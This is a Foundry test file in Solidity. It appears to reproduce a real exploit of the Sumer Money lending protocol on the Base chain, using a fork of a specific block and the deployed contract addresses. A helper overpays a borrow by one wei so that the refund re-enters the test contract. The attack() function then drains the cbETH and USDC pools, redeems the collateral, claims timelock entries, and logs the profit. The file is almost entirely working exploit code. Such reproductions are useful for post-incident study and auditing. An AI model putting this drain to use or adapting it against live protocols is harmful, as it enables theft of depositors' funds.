// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IBalancer.sol";
import "@interface/IWETH9.sol";
import "@interface/IERC20.sol";
import "@interface/ICbETH.sol";

import "./ISumerMoney.sol";

WETH9 constant WETH = WETH9(0x4200000000000000000000000000000000000006);
IERC20 constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

ICEther constant sdrETH = ICEther(
    payable(0x7b5969bB51fa3B002579D7ee41A454AC691716DC)
);

ICErc20 constant sdrUSDC = ICErc20(0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c);
ICErc20 constant sdrcbETH = ICErc20(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);

ICbETH constant cbETH = ICbETH(0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22);

IBalancerVault constant vault = IBalancerVault(
    0xBA12222222228d8Ba445958a75a0704d566BF2C8
);

ITimelock constant timelock = ITimelock(
    payable(0x549D0CdC753601fbE29f9DE186868429a8558E07)
);

contract SumerMoneyHelper {
    address admin;

    constructor() payable {
        admin = msg.sender;
    }

    function borrow() public {
        USDC.approve(address(sdrUSDC), 645000000000);
        sdrUSDC.mint(645000000000);

        sdrETH.borrow(150358797170664290045);
        sdrETH.repayBorrowBehalf{value: 150358797170664290046}(address(this));

        sdrUSDC.redeem(sdrUSDC.balanceOf(address(this)));
        uint256[] memory agreementIds = new uint256[](1);
        agreementIds[0] = 311;
        timelock.claim(agreementIds);

        USDC.transfer(admin, USDC.balanceOf(address(this)));
    }

    receive() external payable {
        if (msg.value == 1) {
            (bool ok, ) = admin.call(abi.encodeWithSignature("attack()"));
            require(ok, "excute attack failed");
        }
    }
}

contract SumerMoneyInteract is Test {
    SumerMoneyHelper helper;

    function setUp() public {
        vm.createSelectFork("base", 13_076_768);

        deal(address(this), 150 ether + 1);
        deal(address(USDC), address(this), 645000000000);

        helper = new SumerMoneyHelper{value: 1}();
    }

    function testExploit() public {
        sdrETH.mint{value: 150 ether}();

        USDC.transfer(address(helper), USDC.balanceOf(address(this)));

        helper.borrow();

        emit log_named_decimal_uint(
            "USDC Balance After exploit",
            USDC.balanceOf(address(this)) - 645000000000,
            USDC.decimals()
        );
        emit log_named_decimal_uint(
            "cbETH Balance After exploit",
            cbETH.balanceOf(address(this)),
            cbETH.decimals()
        );
        emit log_named_decimal_uint(
            "Balance After exploit",
            address(this).balance,
            18
        );
    }

    function attack() public {
        sdrcbETH.borrow(cbETH.balanceOf(address(sdrcbETH)));
        sdrUSDC.borrow(USDC.balanceOf(address(sdrUSDC)) - 645000000000);
        sdrETH.redeemUnderlying(150 ether);

        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 309;
        tokenIds[1] = 310;
        timelock.claim(tokenIds);
    }

    receive() external payable {}
}
